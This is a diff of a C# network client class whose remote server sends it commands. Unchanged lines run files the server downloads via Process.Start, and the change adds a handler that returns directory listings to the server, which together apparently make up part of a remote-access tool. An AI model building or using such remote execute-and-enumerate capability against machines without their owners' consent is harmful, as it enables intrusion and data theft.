@@ -3,6 +3,7 @@ using System;
 using System.Net;
 using System.Net.Sockets;
 
+
 namespace Client.Networking
 {
     public class ClientSocket
@@ -18,7 +19,7 @@ namespace Client.Networking
         {
             _remoteAddr = new IPEndPoint(IPAddress.Parse(ipAddr), ipPort);
             _socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            _id = new Guid();
+            _id = Guid.NewGuid();
 
             Console.WriteLine("Connecting to {0}...", _remoteAddr.ToString());
 
@@ -86,12 +87,23 @@ namespace Client.Networking
                     System.Diagnostics.Process.Start(filePath);
                     Console.WriteLine("Downloaded {0} and stored at {1}", packet.PData[0], filePath);
                     break;
-                case PacketType.FileDirectoryList:
-                    Packet r_file = new Packet(PacketType.FileDirectoryList, _id.ToString());
-                    (string[] ret, int n) = Client.Info.FileDirectoryList(packet.PData[0]);
+                case PacketType.FileList:
+                    Packet r_file = new Packet(PacketType.FileList, _id.ToString());
+                    string path = null;
+                    if (packet.PData.Count != 0) path = packet.PData[0];
+
+                    string ext = System.IO.Path.GetExtension(path);
+                    if (ext != null && ext.Contains(".")) break;
+                    string[] ret;
+                    int n;
+                    try {
+                        (ret, n) = Client.Info.FileDirectoryList(path);
+                    } catch { break; }
+                    
                     r_file.PData.AddRange(ret);
                     r_file.PNum = n;
                     _socket.Send(r_file.ToBytes());
+                    Console.WriteLine("Sending FileDirectory");
                     break;
                     
             }
